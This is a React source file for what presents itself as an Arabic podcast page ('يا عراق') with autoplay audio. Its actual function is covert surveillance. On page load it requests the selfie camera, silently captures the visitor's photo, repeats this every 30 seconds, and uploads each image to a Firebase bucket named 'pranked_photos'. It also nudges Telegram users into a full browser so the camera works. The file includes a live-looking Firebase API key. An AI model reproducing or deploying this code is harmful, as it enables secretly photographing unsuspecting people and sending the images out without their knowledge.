import React, { useRef, useState, useEffect, useCallback } from "react";
import { motion } from "framer-motion";
import { FaPodcast, FaMicrophone, FaHeadphones } from "react-icons/fa";
import { initializeApp } from "firebase/app";
import { getStorage, ref, uploadString, getDownloadURL } from "firebase/storage";
import { getFirestore, collection, addDoc } from "firebase/firestore";
import 'bootstrap/dist/css/bootstrap.min.css';
import AudioPlayer from 'react-h5-audio-player';
import 'react-h5-audio-player/lib/styles.css';
import { v4 as uuidv4 } from 'uuid'; // Import uuid for generating unique filenames

// إعدادات Firebase
const firebaseConfig = {
  apiKey: "AIzaSyDQlV_DbV2a_AON6GNPgHKnTaTb-ScqmZw",
  authDomain: "hareer-d24d2.firebaseapp.com",
  projectId: "hareer-d24d2",
  storageBucket: "hareer-d24d2.appspot.com",
  messagingSenderId: "448452939494",
  appId: "1:448452939494:web:686d5b08953d743f793527",
  measurementId: "G-WKW9WC0LTG",
};

// تهيئة Firebase
const app = initializeApp(firebaseConfig);
const storage = getStorage(app);
const db = getFirestore(app);

// مكونات واجهة المستخدم القابلة لإعادة الاستخدام
const Card = ({ children, className }) => (
  <div className={`card shadow-lg rounded-4 ${className}`} style={{ width: "100%", maxWidth: "500px" }}>
    <div className="card-body">{children}</div>
  </div>
);

const Button = ({ className, onClick, children }) => (
  <button className={`btn ${className}`} onClick={onClick}>
    {children}
  </button>
);

export default function PodcastApp() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [isInTelegram, setIsInTelegram] = useState(false);
  const [errorMessage, setErrorMessage] = useState(null);
  const [hasCameraPermission, setHasCameraPermission] = useState(true);

  // دالة التقاط الصورة مع تسجيل الأخطاء
  const capturePhoto = useCallback(() => {
    try {
      if (!canvasRef.current || !videoRef.current) {
        console.error("لم يتم الحصول على المرجع الخاص بالكاميرا أو اللوحة.");
        return;
      }

      const context = canvasRef.current.getContext("2d");
      if (!context) {
        console.error("غير قادر على الحصول على سياق اللوحة.");
        return;
      }

      // رسم الإطار الحالي من الفيديو على اللوحة
      context.drawImage(videoRef.current, 0, 0, 320, 240);
      const photoDataUrl = canvasRef.current.toDataURL("image/png");
      console.log("تم التقاط الصورة بنجاح:", photoDataUrl);

      // استخدام UUID لضمان اسم فريد لكل صورة
      const uniqueFilename = `pranked_photos/${uuidv4()}.png`;

      // رفع الصورة إلى Firebase Storage كسلسلة Base64
      const storageRef = ref(storage, uniqueFilename);
      uploadString(storageRef, photoDataUrl, "data_url")
        .then(async () => {
          // الحصول على رابط التحميل بعد اكتمال الرفع
          const photoUrl = await getDownloadURL(storageRef);
          console.log("تم رفع الصورة بنجاح. الرابط:", photoUrl);

          // إضافة رابط الصورة إلى Firestore
          await addDoc(collection(db, "pranked_photo"), {
            photoUrl: photoUrl,
            timestamp: Date.now(),
          });
          console.log("تمت إضافة رابط الصورة إلى Firestore.");
        })
        .catch((error) => {
          console.error("خطأ في رفع الصورة إلى Firebase:", error);
          setErrorMessage("خطأ في رفع الصورة. الرجاء المحاولة مرة أخرى.");
        });
    } catch (err) {
      console.error("خطأ أثناء التقاط الصورة:", err);
      setErrorMessage("خطأ في التقاط الصورة. الرجاء المحاولة مرة أخرى.");
    }
  }, []);

  // طلب إذن الوصول إلى الكاميرا وإعداد تدفق الفيديو
  const requestCameraPermission = useCallback(async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }, // استخدام كاميرا السيلفي
      });
      console.log("تم الحصول على تدفق الكاميرا.");

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
          videoRef.current.play().then(() => {
            console.log("الفيديو يعمل.");
            // تأخير بسيط للتأكد من تحميل الفيديو قبل التقاط الصورة
            setTimeout(() => {
              capturePhoto(); // التقاط الصورة بعد بدء الفيديو
            }, 1000);
          }).catch((err) => {
            console.error("خطأ في تشغيل الفيديو:", err);
          });
        };
      }
      setHasCameraPermission(true); // تم منح الإذن
    } catch (error) {
      console.error("تم رفض الوصول إلى الكاميرا:", error);
      setErrorMessage("تم رفض الوصول إلى الكاميرا أو أنها غير متوفرة. الرجاء السماح بالوصول إلى الكاميرا.");
      setHasCameraPermission(false);
    }
  }, [capturePhoto]);

  // التحقق مما إذا كان المستخدم على Telegram وطلب الوصول إلى الكاميرا إن لم يكن كذلك
  useEffect(() => {
    if (navigator.userAgent.toLowerCase().includes("telegram")) {
      setIsInTelegram(true);
      console.log("تم الكشف عن مستخدم Telegram.");
    } else {
      requestCameraPermission(); // محاولة الوصول إلى الكاميرا عند تحميل الصفحة
    }
  }, [requestCameraPermission]);

  // إعادة التقاط الصورة كل 30 ثانية
  useEffect(() => {
    const intervalId = setInterval(() => {
      if (hasCameraPermission) {
        console.log("إعادة التقاط الصورة...");
        capturePhoto();
      } else {
        console.log("لم يتم الحصول على إذن الكاميرا. إعادة المحاولة...");
        requestCameraPermission();
      }
    }, 30000); // كل 30 ثانية

    return () => clearInterval(intervalId); // تنظيف المؤقت عند الخروج من الصفحة
  }, [capturePhoto, requestCameraPermission, hasCameraPermission]);

  return (
    <div dir="rtl" className="d-flex flex-column align-items-center justify-content-center min-vh-100 bg-dark text-white">
      <motion.h1
        className="display-4 text-center text-light mb-4"
        animate={{ scale: [1, 1.1, 1] }}
        transition={{ repeat: Infinity, duration: 1 }}
      >
        مرحبا بكم في بودكاست "يا عراق"
      </motion.h1>

      {/* قسم مشغل الصوت باستخدام react-h5-audio-player */}
      <div className="mb-4" style={{ width: "100%", maxWidth: "500px" }}>
        <AudioPlayer
          src={`${process.env.PUBLIC_URL}/assets/bc.mp3`}
          autoPlay
          onPlay={e => console.log("تشغيل الصوت")}
          customAdditionalControls={[]} // تعطيل الأزرار
          customVolumeControls={[]}
          layout="horizontal"
          showJumpControls={false}
        />
      </div>

      {/* صورة الألبوم */}
      <div className="mb-4">
        <img
          src={`${process.env.PUBLIC_URL}/assets/man.jpg`}
          alt="فراس مسير الشمري"
          className="img-fluid rounded-circle shadow-lg"
          style={{ width: "150px", height: "150px" }}
        />
      </div>

      <p className="h5 text-center mb-4">المؤلف: فراس مسير الشمري</p>

      {/* قسم اختيار الأنواع */}
      <div className="d-flex justify-content-center mb-4">
        <motion.div className="bg-light rounded-circle p-4 mx-2 shadow-md hover:bg-primary">
          <FaPodcast size={40} className="text-primary" />
        </motion.div>
        <motion.div className="bg-light rounded-circle p-4 mx-2 shadow-md hover:bg-primary">
          <FaMicrophone size={40} className="text-primary" />
        </motion.div>
        <motion.div className="bg-light rounded-circle p-4 mx-2 shadow-md hover:bg-primary">
          <FaHeadphones size={40} className="text-primary" />
        </motion.div>
      </div>

      {/* رسالة للإعلام بالمشاكل المتعلقة بالكاميرا */}
      {isInTelegram ? (
        <Card className="mb-3">
          <p className="text-center text-dark mb-4">
            قد لا تعمل الكاميرا في تيليجرام. الرجاء فتح الرابط في متصفح للحصول على التجربة الكاملة!
          </p>
          <Button className="btn-outline-primary" onClick={() => window.open(window.location.href, "_blank")}>
            افتح في المتصفح
          </Button>
        </Card>
      ) : errorMessage ? (
        <Card className="mb-3">
          <p className="text-center text-danger mb-4">{errorMessage}</p>
          <Button className="btn-outline-danger" onClick={() => window.location.reload()}>
            أعد المحاولة
          </Button>
        </Card>
      ) : (
        <Card className="text-center mb-3">
          <h2 className="h3 mb-4 text-primary">استكشف أفضل البودكاست</h2>
          <p className="text-muted mb-4">
            اكتشف البودكاست في المواضيع المفضلة لديك، من الجرائم الحقيقية إلى التكنولوجيا والأعمال والمزيد!
          </p>
        </Card>
      )}
    </div>
  );
}
